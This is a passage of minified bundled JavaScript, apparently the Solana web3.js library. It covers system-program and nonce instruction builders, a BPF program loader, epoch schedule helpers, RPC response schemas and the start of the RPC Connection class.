                            isSigner: !0,
                            isWritable: !0
                        }, {
                            pubkey: e.newAccountPubkey,
                            isSigner: !1,
                            isWritable: !0
                        }];
                        return e.basePubkey != e.fromPubkey && n.push({
                            pubkey: e.basePubkey,
                            isSigner: !0,
                            isWritable: !1
                        }), new fr({
                            keys: n,
                            programId: this.programId,
                            data: t
                        })
                    }
                    static createNonceAccount(e) {
                        const t = new hr;
                        "basePubkey" in e && "seed" in e ? t.add(Rr.createAccountWithSeed({
                            fromPubkey: e.fromPubkey,
                            newAccountPubkey: e.noncePubkey,
                            basePubkey: e.basePubkey,
                            seed: e.seed,
                            lamports: e.lamports,
                            space: Tr,
                            programId: this.programId
                        })) : t.add(Rr.createAccount({
                            fromPubkey: e.fromPubkey,
                            newAccountPubkey: e.noncePubkey,
                            lamports: e.lamports,
                            space: Tr,
                            programId: this.programId
                        }));
                        const n = {
                            noncePubkey: e.noncePubkey,
                            authorizedPubkey: e.authorizedPubkey
                        };
                        return t.add(this.nonceInitialize(n)), t
                    }
                    static nonceInitialize(e) {
                        const t = Ir(Nr.InitializeNonceAccount, {
                                authorized: Rn(e.authorizedPubkey.toBuffer())
                            }),
                            n = {
                                keys: [{
                                    pubkey: e.noncePubkey,
                                    isSigner: !1,
                                    isWritable: !0
                                }, {
                                    pubkey: wr,
                                    isSigner: !1,
                                    isWritable: !1
                                }, {
                                    pubkey: br,
                                    isSigner: !1,
                                    isWritable: !1
                                }],
                                programId: this.programId,
                                data: t
                            };
                        return new fr(n)
                    }
                    static nonceAdvance(e) {
                        const t = Ir(Nr.AdvanceNonceAccount),
                            n = {
                                keys: [{
                                    pubkey: e.noncePubkey,
                                    isSigner: !1,
                                    isWritable: !0
                                }, {
                                    pubkey: wr,
                                    isSigner: !1,
                                    isWritable: !1
                                }, {
                                    pubkey: e.authorizedPubkey,
                                    isSigner: !0,
                                    isWritable: !1
                                }],
                                programId: this.programId,
                                data: t
                            };
                        return new fr(n)
                    }
                    static nonceWithdraw(e) {
                        const t = Ir(Nr.WithdrawNonceAccount, {
                            lamports: e.lamports
                        });
                        return new fr({
                            keys: [{
                                pubkey: e.noncePubkey,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: e.toPubkey,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: wr,
                                isSigner: !1,
                                isWritable: !1
                            }, {
                                pubkey: br,
                                isSigner: !1,
                                isWritable: !1
                            }, {
                                pubkey: e.authorizedPubkey,
                                isSigner: !0,
                                isWritable: !1
                            }],
                            programId: this.programId,
                            data: t
                        })
                    }
                    static nonceAuthorize(e) {
                        const t = Ir(Nr.AuthorizeNonceAccount, {
                            authorized: Rn(e.newAuthorizedPubkey.toBuffer())
                        });
                        return new fr({
                            keys: [{
                                pubkey: e.noncePubkey,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: e.authorizedPubkey,
                                isSigner: !0,
                                isWritable: !1
                            }],
                            programId: this.programId,
                            data: t
                        })
                    }
                    static allocate(e) {
                        let t, n;
                        if ("basePubkey" in e) {
                            t = Ir(Nr.AllocateWithSeed, {
                                base: Rn(e.basePubkey.toBuffer()),
                                seed: e.seed,
                                space: e.space,
                                programId: Rn(e.programId.toBuffer())
                            }), n = [{
                                pubkey: e.accountPubkey,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: e.basePubkey,
                                isSigner: !0,
                                isWritable: !1
                            }]
                        } else {
                            t = Ir(Nr.Allocate, {
                                space: e.space
                            }), n = [{
                                pubkey: e.accountPubkey,
                                isSigner: !0,
                                isWritable: !0
                            }]
                        }
                        return new fr({
                            keys: n,
                            programId: this.programId,
                            data: t
                        })
                    }
                }
                Rr.programId = new Wn("11111111111111111111111111111111");
                const Dr = Vn - 300;
                class zr {
                    constructor() {}
                    static getMinNumSignatures(e) {
                        return 2 * (Math.ceil(e / zr.chunkSize) + 1 + 1)
                    }
                    static async load(e, t, n, i, o) {
                        {
                            const r = await e.getMinimumBalanceForRentExemption(o.length),
                                s = await e.getAccountInfo(n.publicKey, "confirmed");
                            let a = null;
                            if (null !== s) {
                                if (s.executable) return console.error("Program load failed, account is already executable"), !1;
                                s.data.length !== o.length && (a = a || new hr, a.add(Rr.allocate({
                                    accountPubkey: n.publicKey,
                                    space: o.length
                                }))), s.owner.equals(i) || (a = a || new hr, a.add(Rr.assign({
                                    accountPubkey: n.publicKey,
                                    programId: i
                                }))), s.lamports < r && (a = a || new hr, a.add(Rr.transfer({
                                    fromPubkey: t.publicKey,
                                    toPubkey: n.publicKey,
                                    lamports: r - s.lamports
                                })))
                            } else a = (new hr).add(Rr.createAccount({
                                fromPubkey: t.publicKey,
                                newAccountPubkey: n.publicKey,
                                lamports: r > 0 ? r : 1,
                                space: o.length,
                                programId: i
                            }));
                            null !== a && await Er(e, a, [t, n], {
                                commitment: "confirmed"
                            })
                        }
                        const s = Ne.n_([Ne.Jq("instruction"), Ne.Jq("offset"), Ne.Jq("bytesLength"), Ne.Jq("bytesLengthPadding"), Ne.A9(Ne.u8("byte"), Ne.cv(Ne.Jq(), -8), "bytes")]),
                            a = zr.chunkSize;
                        let u = 0,
                            c = o,
                            l = [];
                        for (; c.length > 0;) {
                            const o = c.slice(0, a),
                                f = r.lW.alloc(a + 16);
                            s.encode({
                                instruction: 0,
                                offset: u,
                                bytes: o,
                                bytesLength: 0,
                                bytesLengthPadding: 0
                            }, f);
                            const h = (new hr).add({
                                keys: [{
                                    pubkey: n.publicKey,
                                    isSigner: !0,
                                    isWritable: !0
                                }],
                                programId: i,
                                data: f
                            });
                            if (l.push(Er(e, h, [t, n], {
                                    commitment: "confirmed"
                                })), e._rpcEndpoint.includes("solana.com")) {
                                const e = 4;
                                await Sr(1e3 / e)
                            }
                            u += a, c = c.slice(a)
                        }
                        await Promise.all(l); {
                            const o = Ne.n_([Ne.Jq("instruction")]),
                                s = r.lW.alloc(o.span);
                            o.encode({
                                instruction: 1
                            }, s);
                            const a = (new hr).add({
                                keys: [{
                                    pubkey: n.publicKey,
                                    isSigner: !0,
                                    isWritable: !0
                                }, {
                                    pubkey: br,
                                    isSigner: !1,
                                    isWritable: !1
                                }],
                                programId: i,
                                data: s
                            });
                            await Er(e, a, [t, n], {
                                commitment: "confirmed"
                            })
                        }
                        return !0
                    }
                }
                zr.chunkSize = Dr;
                const Ur = new Wn("BPFLoader2111111111111111111111111111111111");
                class jr {
                    static getMinNumSignatures(e) {
                        return zr.getMinNumSignatures(e)
                    }
                    static load(e, t, n, r, i) {
                        return zr.load(e, t, n, i, r)
                    }
                }
                var Fr = Object.prototype.toString,
                    Hr = Object.keys || function(e) {
                        var t = [];
                        for (var n in e) t.push(n);
                        return t
                    };

                function Wr(e, t) {
                    var n, r, i, o, s, a, u;
                    if (!0 === e) return "true";
                    if (!1 === e) return "false";
                    switch (typeof e) {
                        case "object":
                            if (null === e) return null;
                            if (e.toJSON && "function" === typeof e.toJSON) return Wr(e.toJSON(), t);
                            if ("[object Array]" === (u = Fr.call(e))) {
                                for (i = "[", r = e.length - 1, n = 0; n < r; n++) i += Wr(e[n], !0) + ",";
                                return r > -1 && (i += Wr(e[n], !0)), i + "]"
                            }
                            if ("[object Object]" === u) {
                                for (r = (o = Hr(e).sort()).length, i = "", n = 0; n < r;) void 0 !== (a = Wr(e[s = o[n]], !1)) && (i && (i += ","), i += JSON.stringify(s) + ":" + a), n++;
                                return "{" + i + "}"
                            }
                            return JSON.stringify(e);
                        case "function":
                        case "undefined":
                            return t ? null : void 0;
                        case "string":
                            return JSON.stringify(e);
                        default:
                            return isFinite(e) ? e : null
                    }
                }
                var Kr = function(e) {
                    var t = Wr(e, !1);
                    if (void 0 !== t) return "" + t
                };

                function qr(e) {
                    let t = 0;
                    for (; e > 1;) e /= 2, t++;
                    return t
                }
                class Vr {
                    constructor(e, t, n, r, i) {
                        this.slotsPerEpoch = void 0, this.leaderScheduleSlotOffset = void 0, this.warmup = void 0, this.firstNormalEpoch = void 0, this.firstNormalSlot = void 0, this.slotsPerEpoch = e, this.leaderScheduleSlotOffset = t, this.warmup = n, this.firstNormalEpoch = r, this.firstNormalSlot = i
                    }
                    getEpoch(e) {
                        return this.getEpochAndSlotIndex(e)[0]
                    }
                    getEpochAndSlotIndex(e) {
                        if (e < this.firstNormalSlot) {
                            const n = qr(0 === (t = e + 32 + 1) ? 1 : (t--, t |= t >> 1, t |= t >> 2, t |= t >> 4, t |= t >> 8, t |= t >> 16, 1 + (t |= t >> 32))) - qr(32) - 1;
                            return [n, e - (this.getSlotsInEpoch(n) - 32)]
                        } {
                            const t = e - this.firstNormalSlot,
                                n = Math.floor(t / this.slotsPerEpoch);
                            return [this.firstNormalEpoch + n, t % this.slotsPerEpoch]
                        }
                        var t
                    }
                    getFirstSlotInEpoch(e) {
                        return e <= this.firstNormalEpoch ? 32 * (Math.pow(2, e) - 1) : (e - this.firstNormalEpoch) * this.slotsPerEpoch + this.firstNormalSlot
                    }
                    getLastSlotInEpoch(e) {
                        return this.getFirstSlotInEpoch(e) + this.getSlotsInEpoch(e) - 1
                    }
                    getSlotsInEpoch(e) {
                        return e < this.firstNormalEpoch ? Math.pow(2, e + qr(32)) : this.slotsPerEpoch
                    }
                }
                class Qr extends Error {
                    constructor(e, t) {
                        super(e), this.logs = void 0, this.logs = t
                    }
                }
                const Gr = {
                    JSON_RPC_SERVER_ERROR_BLOCK_CLEANED_UP: -32001,
                    JSON_RPC_SERVER_ERROR_SEND_TRANSACTION_PREFLIGHT_FAILURE: -32002,
                    JSON_RPC_SERVER_ERROR_TRANSACTION_SIGNATURE_VERIFICATION_FAILURE: -32003,
                    JSON_RPC_SERVER_ERROR_BLOCK_NOT_AVAILABLE: -32004,
                    JSON_RPC_SERVER_ERROR_NODE_UNHEALTHY: -32005,
                    JSON_RPC_SERVER_ERROR_TRANSACTION_PRECOMPILE_VERIFICATION_FAILURE: -32006,
                    JSON_RPC_SERVER_ERROR_SLOT_SKIPPED: -32007,
                    JSON_RPC_SERVER_ERROR_NO_SNAPSHOT: -32008,
                    JSON_RPC_SERVER_ERROR_LONG_TERM_STORAGE_SLOT_SKIPPED: -32009,
                    JSON_RPC_SERVER_ERROR_KEY_EXCLUDED_FROM_SECONDARY_INDEX: -32010,
                    JSON_RPC_SERVER_ERROR_TRANSACTION_HISTORY_NOT_AVAILABLE: -32011,
                    JSON_RPC_SCAN_ERROR: -32012,
                    JSON_RPC_SERVER_ERROR_TRANSACTION_SIGNATURE_LEN_MISMATCH: -32013,
                    JSON_RPC_SERVER_ERROR_BLOCK_STATUS_NOT_AVAILABLE_YET: -32014,
                    JSON_RPC_SERVER_ERROR_UNSUPPORTED_TRANSACTION_VERSION: -32015,
                    JSON_RPC_SERVER_ERROR_MIN_CONTEXT_SLOT_NOT_REACHED: -32016
                };
                class Yr extends Error {
                    constructor(e, t) {
                        let {
                            code: n,
                            message: r,
                            data: i
                        } = e;
                        super(null != t ? `${t}: ${r}` : r), this.code = void 0, this.data = void 0, this.code = n, this.data = i, this.name = "SolanaJSONRPCError"
                    }
                }
                var Zr = globalThis.fetch;
                class Jr {
                    constructor(e) {
                        this.key = void 0, this.state = void 0, this.key = e.key, this.state = e.state
                    }
                    isActive() {
                        const e = BigInt("0xffffffffffffffff");
                        return this.state.deactivationSlot === e
                    }
                    static deserialize(e) {
                        const t = function(e, t) {
                                let n;
                                try {
                                    n = e.layout.decode(t)
                                } catch (r) {
                                    throw new Error("invalid instruction; " + r)
                                }
                                if (n.typeIndex !== e.index) throw new Error(`invalid account data; account type mismatch ${n.typeIndex} != ${e.index}`);
                                return n
                            }(Xr, e),
                            n = e.length - 56;
                        ir(n >= 0, "lookup table is invalid"), ir(n % 32 === 0, "lookup table is invalid");
                        const r = n / 32,
                            {
                                addresses: i
                            } = Ne.n_([Ne.A9(Xn(), r, "addresses")]).decode(e.slice(56));
                        return {
                            deactivationSlot: t.deactivationSlot,
                            lastExtendedSlot: t.lastExtendedSlot,
                            lastExtendedSlotStartIndex: t.lastExtendedStartIndex,
                            authority: 0 !== t.authority.length ? new Wn(t.authority[0]) : void 0,
                            addresses: i.map((e => new Wn(e)))
                        }
                    }
                }
                const Xr = {
                        index: 1,
                        layout: Ne.n_([Ne.Jq("typeIndex"), Cr("deactivationSlot"), Ne._O("lastExtendedSlot"), Ne.u8("lastExtendedStartIndex"), Ne.u8(), Ne.A9(Xn(), Ne.cv(Ne.u8(), -1), "authority")])
                    },
                    $r = /^[^:]+:\/\/([^:[]+|\[[^\]]+\])(:\d+)?(.*)/i;
                var ei;
                const ti = lt(Xe(Wn), ot(), (e => new Wn(e))),
                    ni = st([ot(), $e("base64")]),
                    ri = lt(Xe(r.lW), ni, (e => r.lW.from(e[0], "base64"))),
                    ii = 3e4;

                function oi(e) {
                    let t, n;
                    if ("string" === typeof e) t = e;
                    else if (e) {
                        const {
                            commitment: r,
                            ...i
                        } = e;
                        t = r, n = i
                    }
                    return {
                        commitment: t,
                        config: n
                    }
                }

                function si(e) {
                    return ut([at({
                        jsonrpc: $e("2.0"),
                        id: ot(),
                        result: e
                    }), at({
                        jsonrpc: $e("2.0"),
                        id: ot(),
                        error: at({
                            code: ct(),
                            message: ot(),
                            data: rt(Ye("any", (() => !0)))
                        })
                    })])
                }
                const ai = si(ct());

                function ui(e) {
                    return lt(si(e), ai, (t => "error" in t ? t : { ...t,
                        result: Ve(t.result, e)
                    }))
                }

                function ci(e) {
                    return ui(at({
                        context: at({
                            slot: nt()
                        }),
                        value: e
                    }))
                }

                function li(e) {
                    return at({
                        context: at({
                            slot: nt()
                        }),
                        value: e
                    })
                }

                function fi(e, t) {
                    return 0 === e ? new ar({
                        header: t.header,
                        staticAccountKeys: t.accountKeys.map((e => new Wn(e))),
                        recentBlockhash: t.recentBlockhash,
                        compiledInstructions: t.instructions.map((e => ({
                            programIdIndex: e.programIdIndex,
                            accountKeyIndexes: e.accounts,
                            data: xe().decode(e.data)
                        }))),
                        addressTableLookups: t.addressTableLookups
                    }) : new sr(t)
                }
                const hi = at({
                        foundation: nt(),
                        foundationTerm: nt(),
                        initial: nt(),
                        taper: nt(),
                        terminal: nt()
                    }),
                    di = ui(Ze(tt(at({
                        epoch: nt(),
                        effectiveSlot: nt(),
                        amount: nt(),
                        postBalance: nt()
                    })))),
                    pi = at({
                        epoch: nt(),
                        slotIndex: nt(),
                        slotsInEpoch: nt(),
                        absoluteSlot: nt(),
                        blockHeight: rt(nt()),
                        transactionCount: rt(nt())
                    }),
                    yi = at({
                        slotsPerEpoch: nt(),
                        leaderScheduleSlotOffset: nt(),
                        warmup: Je(),
                        firstNormalEpoch: nt(),
                        firstNormalSlot: nt()
                    }),
                    gi = it(ot(), Ze(nt())),
                    mi = tt(ut([at({}), ot()])),
                    wi = at({
                        err: mi
                    }),
                    bi = $e("receivedSignature"),
                    vi = at({
                        "solana-core": ot(),
                        "feature-set": rt(nt())
                    }),
                    Ai = ci(at({
                        err: tt(ut([at({}), ot()])),
                        logs: tt(Ze(ot())),
                        accounts: rt(tt(Ze(tt(at({
                            executable: Je(),
                            owner: ot(),
                            lamports: nt(),
                            data: Ze(ot()),
                            rentEpoch: rt(nt())
                        }))))),
                        unitsConsumed: rt(nt()),
                        returnData: rt(tt(at({
                            programId: ot(),
                            data: st([ot(), $e("base64")])
                        })))
                    })),
                    ki = ci(at({
                        byIdentity: it(ot(), Ze(nt())),
                        range: at({
                            firstSlot: nt(),
                            lastSlot: nt()
                        })
                    }));
                const _i = ui(hi),
                    Ei = ui(pi),
                    Si = ui(yi),
                    Ii = ui(gi),
                    xi = ui(nt()),
                    Mi = ci(at({
                        total: nt(),
                        circulating: nt(),
                        nonCirculating: nt(),
                        nonCirculatingAccounts: Ze(ti)
                    })),
                    Bi = at({
                        amount: ot(),
                        uiAmount: tt(nt()),
                        decimals: nt(),
                        uiAmountString: rt(ot())
                    }),
                    Ti = ci(Ze(at({
                        address: ti,
                        amount: ot(),
                        uiAmount: tt(nt()),
                        decimals: nt(),
                        uiAmountString: rt(ot())
                    }))),
                    Oi = ci(Ze(at({
                        pubkey: ti,
                        account: at({
                            executable: Je(),
                            owner: ti,
                            lamports: nt(),
                            data: ri,
                            rentEpoch: nt()
                        })
                    }))),
                    Ci = at({
                        program: ot(),
                        parsed: ct(),
                        space: nt()
                    }),
                    Pi = ci(Ze(at({
                        pubkey: ti,
                        account: at({
                            executable: Je(),
                            owner: ti,
                            lamports: nt(),
                            data: Ci,
                            rentEpoch: nt()
                        })
                    }))),
                    Li = ci(Ze(at({
                        lamports: nt(),
                        address: ti
                    }))),
                    Ni = at({
                        executable: Je(),
                        owner: ti,
                        lamports: nt(),
                        data: ri,
                        rentEpoch: nt()
                    }),
                    Ri = at({
                        pubkey: ti,
                        account: Ni
                    }),
                    Di = lt(ut([Xe(r.lW), Ci]), ut([ni, Ci]), (e => Array.isArray(e) ? Ve(e, ri) : e)),
                    zi = at({
                        executable: Je(),
                        owner: ti,
                        lamports: nt(),
                        data: Di,
                        rentEpoch: nt()
                    }),
                    Ui = at({
                        pubkey: ti,
                        account: zi
                    }),
                    ji = at({
                        state: ut([$e("active"), $e("inactive"), $e("activating"), $e("deactivating")]),
                        active: nt(),
                        inactive: nt()
                    }),
                    Fi = ui(Ze(at({
                        signature: ot(),
                        slot: nt(),
                        err: mi,
                        memo: tt(ot()),
                        blockTime: rt(tt(nt()))
                    }))),
                    Hi = ui(Ze(at({
                        signature: ot(),
                        slot: nt(),
                        err: mi,
                        memo: tt(ot()),
                        blockTime: rt(tt(nt()))
                    }))),
                    Wi = at({
                        subscription: nt(),
                        result: li(Ni)
                    }),
                    Ki = at({
                        pubkey: ti,
                        account: Ni
                    }),
                    qi = at({
                        subscription: nt(),
                        result: li(Ki)
                    }),
                    Vi = at({
                        parent: nt(),
                        slot: nt(),
                        root: nt()
                    }),
                    Qi = at({
                        subscription: nt(),
                        result: Vi
                    }),
                    Gi = ut([at({
                        type: ut([$e("firstShredReceived"), $e("completed"), $e("optimisticConfirmation"), $e("root")]),
                        slot: nt(),
                        timestamp: nt()
                    }), at({
                        type: $e("createdBank"),
                        parent: nt(),
                        slot: nt(),
                        timestamp: nt()
                    }), at({
                        type: $e("frozen"),
                        slot: nt(),
                        timestamp: nt(),
                        stats: at({
                            numTransactionEntries: nt(),
                            numSuccessfulTransactions: nt(),
                            numFailedTransactions: nt(),
                            maxTransactionsPerEntry: nt()
                        })
                    }), at({
                        type: $e("dead"),
                        slot: nt(),
                        timestamp: nt(),
                        err: ot()
                    })]),
                    Yi = at({
                        subscription: nt(),
                        result: Gi
                    }),
                    Zi = at({
                        subscription: nt(),
                        result: li(ut([wi, bi]))
                    }),
                    Ji = at({
                        subscription: nt(),
                        result: nt()
                    }),
                    Xi = at({
                        pubkey: ot(),
                        gossip: tt(ot()),
                        tpu: tt(ot()),
                        rpc: tt(ot()),
                        version: tt(ot())
                    }),
                    $i = at({
                        votePubkey: ot(),
                        nodePubkey: ot(),
                        activatedStake: nt(),
                        epochVoteAccount: Je(),
                        epochCredits: Ze(st([nt(), nt(), nt()])),
                        commission: nt(),
                        lastVote: nt(),
                        rootSlot: tt(nt())
                    }),
                    eo = ui(at({
                        current: Ze($i),
                        delinquent: Ze($i)
                    })),
                    to = ut([$e("processed"), $e("confirmed"), $e("finalized")]),
                    no = at({
                        slot: nt(),
                        confirmations: tt(nt()),
                        err: mi,
                        confirmationStatus: rt(to)
                    }),
                    ro = ci(Ze(tt(no))),
                    io = ui(nt()),
                    oo = at({
                        accountKey: ti,
                        writableIndexes: Ze(nt()),
                        readonlyIndexes: Ze(nt())
                    }),
                    so = at({
                        signatures: Ze(ot()),
                        message: at({
                            accountKeys: Ze(ot()),
                            header: at({
                                numRequiredSignatures: nt(),
                                numReadonlySignedAccounts: nt(),
                                numReadonlyUnsignedAccounts: nt()
                            }),
                            instructions: Ze(at({
                                accounts: Ze(nt()),
                                data: ot(),
                                programIdIndex: nt()
                            })),
                            recentBlockhash: ot(),
                            addressTableLookups: rt(Ze(oo))
                        })
                    }),
                    ao = at({
                        parsed: ct(),
                        program: ot(),
                        programId: ti
                    }),
                    uo = at({
                        accounts: Ze(ti),
                        data: ot(),
                        programId: ti
                    }),
                    co = lt(ut([uo, ao]), ut([at({
                        parsed: ct(),
                        program: ot(),
                        programId: ot()
                    }), at({
                        accounts: Ze(ot()),
                        data: ot(),
                        programId: ot()
                    })]), (e => Ve(e, "accounts" in e ? uo : ao))),
                    lo = at({
                        signatures: Ze(ot()),
                        message: at({
                            accountKeys: Ze(at({
                                pubkey: ti,
                                signer: Je(),
                                writable: Je(),
                                source: rt(ut([$e("transaction"), $e("lookupTable")]))
                            })),
                            instructions: Ze(co),
                            recentBlockhash: ot(),
                            addressTableLookups: rt(tt(Ze(oo)))
                        })
                    }),
                    fo = at({
                        accountIndex: nt(),
                        mint: ot(),
                        owner: rt(ot()),
                        uiTokenAmount: Bi
                    }),
                    ho = at({
                        writable: Ze(ti),
                        readonly: Ze(ti)
                    }),
                    po = at({
                        err: mi,
                        fee: nt(),
                        innerInstructions: rt(tt(Ze(at({
                            index: nt(),
                            instructions: Ze(at({
                                accounts: Ze(nt()),
                                data: ot(),
                                programIdIndex: nt()
                            }))
                        })))),
                        preBalances: Ze(nt()),
                        postBalances: Ze(nt()),
                        logMessages: rt(tt(Ze(ot()))),
                        preTokenBalances: rt(tt(Ze(fo))),
                        postTokenBalances: rt(tt(Ze(fo))),
                        loadedAddresses: rt(ho),
                        computeUnitsConsumed: rt(nt())
                    }),
                    yo = at({
                        err: mi,
                        fee: nt(),
                        innerInstructions: rt(tt(Ze(at({
                            index: nt(),
                            instructions: Ze(co)
                        })))),
                        preBalances: Ze(nt()),
                        postBalances: Ze(nt()),
                        logMessages: rt(tt(Ze(ot()))),
                        preTokenBalances: rt(tt(Ze(fo))),
                        postTokenBalances: rt(tt(Ze(fo))),
                        loadedAddresses: rt(ho),
                        computeUnitsConsumed: rt(nt())
                    }),
                    go = ut([$e(0), $e("legacy")]),
                    mo = ui(tt(at({
                        blockhash: ot(),
                        previousBlockhash: ot(),
                        parentSlot: nt(),
                        transactions: Ze(at({
                            transaction: so,
                            meta: tt(po),
                            version: rt(go)
                        })),
                        rewards: rt(Ze(at({
                            pubkey: ot(),
                            lamports: nt(),
                            postBalance: tt(nt()),
                            rewardType: tt(ot())
                        }))),
                        blockTime: tt(nt()),
                        blockHeight: tt(nt())
                    }))),
                    wo = ui(tt(at({
                        blockhash: ot(),
                        previousBlockhash: ot(),
                        parentSlot: nt(),
                        transactions: Ze(at({
                            transaction: lo,
                            meta: tt(yo),
                            version: rt(go)
                        })),
                        rewards: rt(Ze(at({
                            pubkey: ot(),
                            lamports: nt(),
                            postBalance: tt(nt()),
                            rewardType: tt(ot())
                        }))),
                        blockTime: tt(nt()),
                        blockHeight: tt(nt())
                    }))),
                    bo = ui(tt(at({
                        blockhash: ot(),
                        previousBlockhash: ot(),
                        parentSlot: nt(),
                        transactions: Ze(at({
                            transaction: so,
                            meta: tt(po)
                        })),
                        rewards: rt(Ze(at({
                            pubkey: ot(),
                            lamports: nt(),
                            postBalance: tt(nt()),
                            rewardType: tt(ot())
                        }))),
                        blockTime: tt(nt())
                    }))),
                    vo = ui(tt(at({
                        blockhash: ot(),
                        previousBlockhash: ot(),
                        parentSlot: nt(),
                        signatures: Ze(ot()),
                        blockTime: tt(nt())
                    }))),
                    Ao = ui(tt(at({
                        slot: nt(),
                        meta: po,
                        blockTime: rt(tt(nt())),
                        transaction: so,
                        version: rt(go)
                    }))),
                    ko = ui(tt(at({
                        slot: nt(),
                        transaction: lo,
                        meta: tt(yo),
                        blockTime: rt(tt(nt())),
                        version: rt(go)
                    }))),
                    _o = ci(at({
                        blockhash: ot(),
                        feeCalculator: at({
                            lamportsPerSignature: nt()
                        })
                    })),
                    Eo = ci(at({
                        blockhash: ot(),
                        lastValidBlockHeight: nt()
                    })),
                    So = ui(Ze(at({
                        slot: nt(),
                        numTransactions: nt(),
                        numSlots: nt(),
                        samplePeriodSecs: nt()
                    }))),
                    Io = ci(tt(at({
                        feeCalculator: at({
                            lamportsPerSignature: nt()
                        })
                    }))),
                    xo = ui(ot()),
                    Mo = ui(ot()),
                    Bo = at({
                        err: mi,
                        logs: Ze(ot()),
                        signature: ot()
                    }),
                    To = at({
                        result: li(Bo),
                        subscription: nt()
                    }),
                    Oo = {
                        "solana-client": `js/${null!==(ei="0.0.0-development")?ei:"UNKNOWN"}`
                    };
                class Co {
                    constructor(e, t) {
                        let n, r, i, o, s;
                        var a;
                        this._commitment = void 0, this._confirmTransactionInitialTimeout = void 0, this._rpcEndpoint = void 0, this._rpcWsEndpoint = void 0, this._rpcClient = void 0, this._rpcRequest = void 0, this._rpcBatchRequest = void 0, this._rpcWebSocket = void 0, this._rpcWebSocketConnected = !1, this._rpcWebSocketHeartbeat = null, this._rpcWebSocketIdleTimeout = null, this._rpcWebSocketGeneration = 0, this._disableBlockhashCaching = !1, this._pollingBlockhash = !1, this._blockhashInfo = {
                            latestBlockhash: null,
                            lastFetch: 0,
                            transactionSignatures: [],
                            simulatedSignatures: []
                        }, this._nextClientSubscriptionId = 0, this._subscriptionDisposeFunctionsByClientSubscriptionId = {}, this._subscriptionCallbacksByServerSubscriptionId = {}, this._subscriptionsByHash = {}, this._subscriptionsAutoDisposedByRpc = new Set, t && "string" === typeof t ? this._commitment = t : t && (this._commitment = t.commitment, this._confirmTransactionInitialTimeout = t.confirmTransactionInitialTimeout, n = t.wsEndpoint, r = t.httpHeaders, i = t.fetch, o = t.fetchMiddleware, s = t.disableRetryOnRateLimit), this._rpcEndpoint = function(e) {
                            if (!1 === /^https?:/.test(e)) throw new TypeError("Endpoint URL must start with `http:` or `https:`.");
                            return e
                        }(e), this._rpcWsEndpoint = n || function(e) {
                            const t = e.match($r);
                            if (null == t) throw TypeError(`Failed to validate endpoint URL \`${e}\``);
                            const [n, r, i, o] = t, s = e.startsWith("https:") ? "wss:" : "ws:", a = null == i ? null : parseInt(i.slice(1), 10);
                            return `${s}//${r}${null==a?"":`:${a+1}`}${o}`
                        }(e), this._rpcClient = function(e, t, n, r, i) {
                            const o = n || Zr;
                            let s;
                            return r && (s = async (e, t) => {
                                const n = await new Promise(((n, i) => {
                                    try {
                                        r(e, t, ((e, t) => n([e, t])))
                                    } catch (o) {
                                        i(o)
                                    }
                                }));
                                return await o(...n)
                            }), new(dt())((async (n, r) => {
                                const a = {
                                    method: "POST",
                                    body: n,
                                    agent: void 0,
                                    headers: Object.assign({
                                        "Content-Type": "application/json"
                                    }, t || {}, Oo)
                                };
                                try {
                                    let t, n = 5,
                                        u = 500;
                                    for (; t = s ? await s(e, a) : await o(e, a), 429 === t.status && !0 !== i && (n -= 1, 0 !== n);) console.log(`Server responded with ${t.status} ${t.statusText}.  Retrying after ${u}ms delay...`), await Sr(u), u *= 2;
                                    const c = await t.text();
                                    t.ok ? r(null, c) : r(new Error(`${t.status} ${t.statusText}: ${c}`))
                                } catch (u) {
                                    u instanceof Error && r(u)
                                }
                            }), {})
                        }(e, r, i, o, s), this._rpcRequest = (a = this._rpcClient, (e, t) => new Promise(((n, r) => {
                            a.request(e, t, ((e, t) => {
                                e ? r(e) : n(t)
                            }))
                        }))), this._rpcBatchRequest = function(e) {
                            return t => new Promise(((n, r) => {
                                0 === t.length && n([]);
                                const i = t.map((t => e.request(t.methodName, t.args)));
                                e.request(i, ((e, t) => {
                                    e ? r(e) : n(t)
                                }))
                            }))
                        }(this._rpcClient), this._rpcWebSocket = new ft.K(this._rpcWsEndpoint, {
                            autoconnect: !1,
                            max_reconnects: 1 / 0
                        }), this._rpcWebSocket.on("open", this._wsOnOpen.bind(this)), this._rpcWebSocket.on("error", this._wsOnError.bind(this)), this._rpcWebSocket.on("close", this._wsOnClose.bind(this)), this._rpcWebSocket.on("accountNotification", this._wsOnAccountNotification.bind(this)), this._rpcWebSocket.on("programNotification", this._wsOnProgramAccountNotification.bind(this)), this._rpcWebSocket.on("slotNotification", this._wsOnSlotNotification.bind(this)), this._rpcWebSocket.on("slotsUpdatesNotification", this._wsOnSlotUpdatesNotification.bind(this)), this._rpcWebSocket.on("signatureNotification", this._wsOnSignatureNotification.bind(this)), this._rpcWebSocket.on("rootNotification", this._wsOnRootNotification.bind(this)), this._rpcWebSocket.on("logsNotification", this._wsOnLogsNotification.bind(this))
                    }
                    get commitment() {
                        return this._commitment
                    }
                    get rpcEndpoint() {
                        return this._rpcEndpoint
                    }
                    async getBalanceAndContext(e, t) {
                        const {
                            commitment: n,
                            config: r
                        } = oi(t), i = this._buildArgs([e.toBase58()], n, void 0, r), o = Ve(await this._rpcRequest("getBalance", i), ci(nt()));
                        if ("error" in o) throw new Yr(o.error, `failed to get balance for ${e.toBase58()}`);
                        return o.result
                    }
                    async getBalance(e, t) {
                        return await this.getBalanceAndContext(e, t).then((e => e.value)).catch((t => {
                            throw new Error("failed to get balance of account " + e.toBase58() + ": " + t)
                        }))
                    }
                    async getBlockTime(e) {
                        const t = Ve(await this._rpcRequest("getBlockTime", [e]), ui(tt(nt())));
                        if ("error" in t) throw new Yr(t.error, `failed to get block time for slot ${e}`);
                        return t.result
                    }
                    async getMinimumLedgerSlot() {
                        const e = Ve(await this._rpcRequest("minimumLedgerSlot", []), ui(nt()));
                        if ("error" in e) throw new Yr(e.error, "failed to get minimum ledger slot");
                        return e.result
                    }
                    async getFirstAvailableBlock() {
                        const e = Ve(await this._rpcRequest("getFirstAvailableBlock", []), xi);
                        if ("error" in e) throw new Yr(e.error, "failed to get first available block");
                        return e.result
                    }
                    async getSupply(e) {
                        let t = {};
                        t = "string" === typeof e ? {
                            commitment: e
                        } : e ? { ...e,
